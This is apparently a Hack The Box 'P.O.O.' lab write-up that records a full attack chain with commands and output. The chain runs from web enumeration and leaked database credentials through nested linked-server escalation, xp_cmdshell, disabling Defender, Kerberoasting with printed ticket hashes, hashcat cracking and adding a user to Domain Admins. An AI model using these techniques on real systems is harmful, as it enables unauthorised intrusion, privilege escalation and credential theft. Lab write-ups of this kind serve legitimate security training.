# 10.13.38.11 - Entrypoint

- `nmap scan`
```
Starting Nmap 7.93 ( https://nmap.org ) at 2025-01-24 22:54 EST
Nmap scan report for poo1.htb (10.13.38.11)
Host is up (0.020s latency).

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.2056.00; RTM+
| ms-sql-info:
|   10.13.38.11:1433:
|     Version:
|       name: Microsoft SQL Server 2017 RTM+
|       number: 14.00.2056.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: true
|_    TCP port: 1433
| ms-sql-ntlm-info:
|   10.13.38.11:1433:
|     Target_Name: POO
|     NetBIOS_Domain_Name: POO
|     NetBIOS_Computer_Name: COMPATIBILITY
|     DNS_Domain_Name: intranet.poo
|     DNS_Computer_Name: COMPATIBILITY.intranet.poo
|     DNS_Tree_Name: intranet.poo
|_    Product_Version: 10.0.17763
|_ssl-date: 2025-01-25T03:54:38+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-01-24T19:42:05
|_Not valid after:  2055-01-24T19:42:05
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.77 seconds
```

- `gobuster dir -u http://poo1.htb -w /opt/SecLists/Discovery/Web-Content/raft`
- Found a `.ds_store`
- Enumerate using DS_Walk - `https://github.com/Keramas/DS_Walk?tab=readme-ov-file`
```
python3 ds_walk.py -u http://poo1.htb
[!] .ds_store file is present on the webserver.
[+] Enumerating directories based on .ds_server file:
----------------------------
[!] http://poo1.htb/admin
[!] http://poo1.htb/dev
[!] http://poo1.htb/iisstart.htm
[!] http://poo1.htb/Images
[!] http://poo1.htb/JS
[!] http://poo1.htb/META-INF
[!] http://poo1.htb/New folder
[!] http://poo1.htb/New folder (2)
[!] http://poo1.htb/Plugins
[!] http://poo1.htb/Templates
[!] http://poo1.htb/Themes
[!] http://poo1.htb/Uploads
[!] http://poo1.htb/web.config
[!] http://poo1.htb/Widgets
----------------------------
[!] http://poo1.htb/dev/304c0c90fbc6520610abbf378e2339d1
[!] http://poo1.htb/dev/dca66d38fd916317687e1390a420c3fc
----------------------------
[!] http://poo1.htb/dev/304c0c90fbc6520610abbf378e2339d1/core
[!] http://poo1.htb/dev/304c0c90fbc6520610abbf378e2339d1/db
[!] http://poo1.htb/dev/304c0c90fbc6520610abbf378e2339d1/include
[!] http://poo1.htb/dev/304c0c90fbc6520610abbf378e2339d1/src
----------------------------
[!] http://poo1.htb/dev/dca66d38fd916317687e1390a420c3fc/core
[!] http://poo1.htb/dev/dca66d38fd916317687e1390a420c3fc/db
[!] http://poo1.htb/dev/dca66d38fd916317687e1390a420c3fc/include
[!] http://poo1.htb/dev/dca66d38fd916317687e1390a420c3fc/src
----------------------------
[!] http://poo1.htb/Images/buttons
[!] http://poo1.htb/Images/icons
[!] http://poo1.htb/Images/iisstart.png
----------------------------
[!] http://poo1.htb/JS/custom
----------------------------
[!] http://poo1.htb/Themes/default
----------------------------
[!] http://poo1.htb/Widgets/CalendarEvents
[!] http://poo1.htb/Widgets/Framework
[!] http://poo1.htb/Widgets/Menu
[!] http://poo1.htb/Widgets/Notifications
----------------------------
[!] http://poo1.htb/Widgets/Framework/Layouts
----------------------------
[!] http://poo1.htb/Widgets/Framework/Layouts/custom
[!] http://poo1.htb/Widgets/Framework/Layouts/default
----------------------------
[*] Finished traversing. No remaining .ds_store files present.
[*] Cleaning up .ds_store files saved to disk.
```

- Crack /dev/ hashes to find users: `mrb3n, eks`
- `sudo go run cmd/shortscan/main.go http://poo1.htb/dev/dca66d38fd916317687e1390a420c3fc/db`
```
════════════════════════════════════════════════════════════════════════════════
URL: http://poo1.htb/dev/dca66d38fd916317687e1390a420c3fc/db/
Running: Microsoft-IIS/10.0
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
POO_CO~1.TXT         POO_CO?.TXT?
```
- Manually tried the various filenames that could be - connection, config, configuration etc
- `http://poo1.htb/dev/dca66d38fd916317687e1390a420c3fc/db/POO_CONNECTION.TXT`
```
SERVER=10.13.38.11
USERID=external_user
DBNAME=POO_PUBLIC
USERPWD=#p00Public3xt3rnalUs3r#

Flag : POO{fcfb0767f5bd3cbc22f40ff5011ad555}
```

<hr>

- login into mssql using `sqsh -S 10.18.38.11 -U external_user -P \#p00Public3xt3rnalUs3r\#`

- Identify linked servers
- `EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [COMPATIBILITY\POO_CONFIG]`
```
COMPATIBILITY\POO_CONFIG


        Microsoft SQL Server 2017 (RTM-GDR) (KB5040942) - 14.0.2056.2 (X64)
        Jun 20 2024 11:02:32
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)


        internal_user
```

- Nothing works on either PUBLIC or CONFIG

- Double nested
- Check if internal_user on linked server POO_CONFIG has a linked server?
    - POO_PUBLIC is again linked and executes as 'sa' - 'sysadmin'
```
EXECUTE (
  'EXECUTE('' SELECT srvname, isremote FROM sysservers '') AT [COMPATIBILITY\POO_PUBLIC]'
) AT [COMPATIBILITY\POO_CONFIG]
```

- Login as user SA
```
EXECUTE (
  'EXECUTE(''EXECUTE AS LOGIN = ''''sa'''''') AT [COMPATIBILITY\POO_PUBLIC]'
) AT [COMPATIBILITY\POO_CONFIG]
```

- Grant external_user the sysadmin permissions
```
EXECUTE (
	'EXECUTE(''EXEC master..sp_addsrvrolemember @loginame = N''''external_user'''', @rolename = N''''sysadmin'''''') AT [COMPATIBILITY\POO_PUBLIC]'
) AT [COMPATIBILITY\POO_CONFIG]
```

- Enable xp_cmdshell
- xp_cmdshell 'whoami'
    - `nt service\mssql$poo_public`

- xp_cmdshell 'ipconfig'
    - Internal network : 172.20.128.101

- SELECT * FROM flag.dbo.flag;
` POO{88d829eb39f2d11697e689d779810d42} `

<hr>

```
xp_cmdshell 'powershell; ls C:\Program` Files\Microsoft` SQL` Server\MSSQL14.POO_CONFIG\MSSQL\Backup'
```

EXECUTE(' SELECT system_user ') AT [COMPATIBILITY\POO_CONFIG]

EXECUTE (
  'EXECUTE('' EXECUTE('''' SELECT system_user '''') AT [COMPATIBILITY\POO_CONFIG] '') AT [COMPATIBILITY\POO_PUBLIC]'
) AT [COMPATIBILITY\POO_CONFIG]

- Running python scripts as we know we have python

```
EXECUTE sp_execute_external_script @language = N'Python'
    , @script = N'
import os;
os.system(''type C:\inetpub\wwwroot\web.config '')
'
```

- `Administrator:EverybodyWantsToWorkAtP.O.O.`

- Go back to the webpage at `poo1.htb/admin` and enter these creds

- Get the BackTrack flag.
  - `POO{4882bd2ccfd4b5318978540d9843729f}`

<hr>

- Try commands over IPv6

- `ipconfig` - IPv6 address -> `dead:beef::1001`
- Add `dead:beef::1001  poo1.htb` to /etc/hosts

- `evil-winrm -i poo1.htb -u Administrator -p EverybodyWantsToWorkAtP.O.O.`

- Get Foothold flag.
  - `POO{ff87c4fe10e2ef096f9a96a01c646f8f}`

<hr>

- Use `Sharphound.exe` to get AD details
  - wont work with admin as local admin might not be a part of the domain group
  - run as the mssql login user
    - use `mssql_shell.py`
  - download the files generated by sharphound

- Upload files on BloodHound and check the "SHORTEST PATH TO DOMAIN ADMIN FROM KERBEROASTABLE USERS"

- We can see that p00_adm is a part of the p00 help desk that has "Generic All" over domain admins

- We can try to find the p00_adm creds and add it to the domain admins group

- Turn the defender off:
  - `Set-MpPreference -DisableRealtimeMonitoring $true`
- Use `Invoke-Kerberoast` on the MSSQL user
  - `xp_cmdshell 'powershell -c Import-Module c:\Users\MSSQL$POO_PUBLIC\AppData\Local\Temp\Invoke-Kerberoast.ps1; Invoke-Kerberoast -outputformat hashcat`
  - we get the creds for `p00_adm and p00_hr`
  - We will crack `p00_adm` as it is our way to domain admin

```
 TicketByteHexStream  :
        Hash                 : 


        $krb5tgs$23$*p00_hr$intranet.poo$HR_peoplesoft/intranet.poo:1433*$2FCE2A938894BBA2A16A61DD7BE854D7$8790BD39E718A0BCD272BF8CB1B196188479F9E77931BDECC9AECAB53B0D76B7AFC96836E545137F39B50E34E20759DBBF70217F756F974A169B23F94CAD3726340FA4950FE88E67BB31764048CD0E71EC23F02F0E03926577066ACCB2DAC8CC5FC27DE42807136D32CE8A75D3033C240B21B82191764E9FDE99E1CB2157E6157A68060FE1BF24D8E4366D1A841EE505988562A9DCDF2ED1BD6EFD38995E3C85BC40885056B35CFEDB74CE6E5849650574BC2793E3A6BE2EEA3B8D3867933C1CD3FB5540155137A870F1F2E9890982A0B4CBA2D6554AB7FD2D52314FCB5DC7B174F8ACC9A123620BA27C4E05CEE555D6BE4B7C3B441AB6CCE0259A53AEDB0AEF443E2BB277375BC519093F7E448AC586E076DECD2F2BBDAFA50225646B648F35659458CA1164979DBD2CD3E3219E26F0F2E7DAAB93265B9F498D406EBE1D507271E6106A4F59A15E929505811288EC28FD8D0F3D9C58EDA300E9D2619C052E7DB2FE16D56D4CD582ED6B38C02A75EF247AA3E407AB71D82883163B33664826C716FFD8EA0C79A5642B6A70E88AA546BE1666ADB150301948F067E4D33E4EF86A34CF45592279B07FC592DEDF3ACFE75EB853231CF1B099470D584719145E21EC4FFB2FE07F376EB0F8710F3CCE4268493921DACB257DF15313094F0E866B3C3D2FBB0A5F9C1C2290259C7028A7DE71EDFFF6563F1217B736E27FB72B74FAA42AC7C1BFE6304939E9234B00BDAB7166A4F14D620C62593B086E0369ECE1D52C6B66BB1D30F2FFD3138054C32AFB8C508370ADB8FFE1C25FD4F4188D0D7788827926EE2E8D388BE18E8A2FBD5AC0D4E674C83A784CE3EE47002F6A0C1BE98FB8885977A52C963D0BA5E5D54EE7C8ABBACDFAB60D060CD2AF67B320342A815160F532C1FAC27F7E7068917BC06CA553A19F79709860357ED6DBE3B3C9F051381BC95ECC2067D55050D7616C73F22FAB4202FE8042C3DBC8B77218617392607766934335B568B6787EA442FF56CB39862D725E61A183DA68445DE95C97736550A682C9FF1531CB97A421DE89F29498F1B0A94F516EBB3735E19AC4939DDB7A6D9225DF90D04C94F44B21455C4DF6CF07B91942B7D233DBBC43F6425B7DFD8857AF1533A5C5DA5B1CBD6E3B608DB1D0942551152E79486D5B3BD4D4A8DCA2BB54D5C7AAA196D37D9F827F41B8C727FE855916CCE2819A86C7EC5075A420D33224499B9919A1995D29C256DB0FA1CB1F8528A9143FCD265B69F25A5A9080800030A317EA866545A74D1AE04AB4729F1DAA9087CBBE7B98832D16736A31D8926DBCDB02A13DF25D483EEA9BA73C9681FCDE8DAF1D4976C7DC1FBA9DDA841C2D36EF77D3506B8AE807C210E78CD1B8AC3118177A2645CB46E27E09D730A2C3A7A5E07A471DA189B096FD6990E7093370471C277037D2CB000E6D9697E8E48A3861880DC1026B45ED9A7C5BFF5B17126E4D494AE7A056596DE25CFE03E30F9F6C945670A40794E57CA1CCDC3775930C7E6D039D52D53D0C3355EC1230E695BFF9D9C1D577F5A72F6177BF32E4A668720E9A7EC2C9708AE74B1E3CF923DDE6FAE0F62AE7C151900721D29730D3B6281CCA6ED1826C9BEB5D25514D97B3813DD81186B023975EDBD0B154FD3E1245B5E9160C6A04E6BD7E00E9153352FDED9B801B49674A0BDC131BAF1D3D4D26183DB84177
        SamAccountName       : p00_hr
        DistinguishedName    : CN=p00_hr,CN=Users,DC=intranet,DC=poo
        ServicePrincipalName : HR_peoplesoft/intranet.poo:1433
        NULL



        TicketByteHexStream  :
        Hash                 : 
        
        
        $krb5tgs$23$*p00_adm$intranet.poo$cyber_audit/intranet.poo:443*$C858EBC6504FB9169BEBA32C694B600D$CA05C733F593778F7CC6700021F40B551D3C7098A18305AD447F5B790BEECCB42EC36BF43699A2B1564738834C21223CC13F85181274226B24AA03CFE70383DE546600AFD8D6D0600F4684A4DB3783B37AFB6A77ADE4E0727F0F8544A18BCAF3B28209A3F5A936942873940A3AD3B400D1203179504E4F10B8B375696644F2CC2F8E23CDF82C161550FBBAF7B58D801342EEE238FD11EF7DDA677306BBA466461F5A4AD85E14DE9322928BEB0CA436C868B26D43F504D5CEDEE09974ABE90F59F2D665A2B6D76E479A7C5DC033BC5A44823C3E33E8242D16ABA8FB36EB0DE19FF2E52F9C75B59E035A6C3E1C8A2F94FB77F7EC06ADB35F7BD918C7F3D2E224D94468BC817C8B51C53F52A488C22DF51341D1A724220D2A408B88AD293671B9A35FE43E61F51B0C0AF2638FD3D7E5DE01462CD9414255D3188DFF7DAA91C4F62FD61EB0DFEB713D3E7D975A2EE0FBF83F81A8597E260B52532477E7DCC3DD58E6069F04DD9D59D29F9B10A3B31E2D9B5C7539E4A9DAD33A2436035C56E3F393EF88CD8ED221C5A36DEEC5AB3F0E643BD7A2607C564DB0F4F9AE0F13F0336E6C58FF2A2BE918BED2646DEF112D04028AAAB94B83D7418E33151BE10FF4579C110C31D8A772F1978DD8DFCE881501D239E1EDB25751FFF3C57E9FA00046D2DE095027504614E100DBD0F01A18DE1FE8E4827FD7F549BF76216248E5BACD9BA697F1F5736ADE9CF895C8E0D483D7D273F69B1F5D630165446DA1C8DF708498B620C4330FF7E4A0AB4C6FF2C78F88A0351E0DDF1769606F1F2DC236882F8CF435DB64ADDDCB4BF8A437A9D7DB195859F21BB8265B703292E32CE9430ECA1DABFF9B3C3D208FD51AA495D8CA24A302A582DAAEAD69DF57C3CD44056AAE58E862F3784502B57D955FC190CAA6AB5CAB0354BAF7B13B3A2A5D1D36E72F28701DCA405E8A01D08ABD49DE857C7D225749DC0BD4DCBC8D047AAD2D43A6769B616D0741662E395E9D4CC23DD38FA682100CE519C33FD868DF85662558880E7C9FEC7135DBAF5414DD61D18B3E8FC79EDA3A8F45C3A49F1726A2F7228FB4F3ECB8463C8D37347546655865092A24AF52711FC69BFB8F9BEF70610F5917708E866A51148DC6C1FB2F74D457CF1E2858C34F2A39D58989D5343C1249933061E428D945BD528827D70F4ABF525A99730FDDF2ADF0286157024BC61D12F4DBE2075DC349E6A28C1DEF97D106736E4A9F67D1F0EAE673DBC819F8ECC68F460ED75472ECB04526682280251F669C82D5EEBF3A2F46781457C661BFBA9CB773AE4519EFF3A72F31CFF430ACD464E90ED7775FD705A16A98385082CA1A363AC8D61D65F33951DA2176BAE443E07BDE5A56F2C5F97250EE859FF30106C740A82D8170B6A23B577CC240C4C7A678E13B195B09994A73A8D31BC1ED3771D109A4F0A388B7BDAD754859515A7A5C9DE39A1628F5AE4F711ECE62A4B937293C07E820F59B862BCC11600E68BF5A415ECF800D85714D6855CF7D261294A66B35CCACC7BE8E6B2755E3E9BA674FB4D9CFAC0A466601BEE2BDFD0717631D524B77A4D30CE6D1EC2471BD71B5DDA14E389CC453D27BF737F2441BD014340CA5B82AFD31B10A17760541764744DBA259F7EBA5BEF1937A338A8EE56F4A590B823522B2998C70FE7538AED0A8E786715CDCAF7FBDD6C51F808D4386EE

        Cracked:ZQ!5t4r

        SamAccountName       : p00_adm
        DistinguishedName    : CN=p00_adm,CN=Users,DC=intranet,DC=poo
        ServicePrincipalName : cyber_audit/intranet.poo:443
```
 
- `hashcat -m 13100 --force -a 0 p00_adm.hash /opt/SecLists/Passwords/Keyboard-Walks/Keyboard-Combinations.txt`

- now, we will add the p00_adm user to the Domain Admins group using PowerView
- Upload powerview.ps1

- As the admin user
```
Invoke-Module .\PowerView.ps1
$secpass = ConvertTo-SecureString 'ZQ!5t4r' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('intranet.poo\p00_adm', $secpass)
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'p00_adm' -Credential $cred
```

- `Get-ADDomainController -Credential $cred`
```
ComputerObjectDN           : CN=DC,OU=Domain Controllers,DC=intranet,DC=poo
DefaultPartition           : DC=intranet,DC=poo
Domain                     : intranet.poo
Enabled                    : True
Forest                     : intranet.poo
HostName                   : DC.intranet.poo
InvocationId               : 72a0263b-18dc-4913-81f3-b175ee7cd4a3
IPv4Address                : 172.20.128.53
IPv6Address                :
IsGlobalCatalog            : True
IsReadOnly                 : False
LdapPort                   : 389
Name                       : DC
NTDSSettingsObjectDN       : CN=NTDS Settings,CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intranet,DC=poo
OperatingSystem            : Windows Server 2016 Standard
OperatingSystemHotfix      :
OperatingSystemServicePack :
OperatingSystemVersion     : 10.0 (14393)
OperationMasterRoles       : {SchemaMaster, DomainNamingMaster, PDCEmulator, RIDMaster...}
Partitions                 : {DC=ForestDnsZones,DC=intranet,DC=poo, DC=DomainDnsZones,DC=intranet,DC=poo, CN=Schema,CN=Configuration,DC=intranet,DC=poo, CN=Configuration,DC=intranet,DC=poo...}
ServerObjectDN             : CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=intranet,DC=poo
ServerObjectGuid           : 480bbd0d-2c89-44ad-a782-81ff9587f016
Site                       : Default-First-Site-Name
SslPort                    : 636
```

- The Domain Controller hostname - `DC.intranet.poo`

- `net use \\DC.intranet.poo /u:intranet.poo\p00_adm 'ZQ!5t4r'`

- `dir \\DC.intranet.poo\C$\Users\mr3ks\Desktop`

- `copy \\DC.intranet.poo\C$\Users\mr3ks\Desktop\flag.txt .`

- Get p00ned flag
  - POO{1196ef8bc523f084ad1732a38a0851d6}
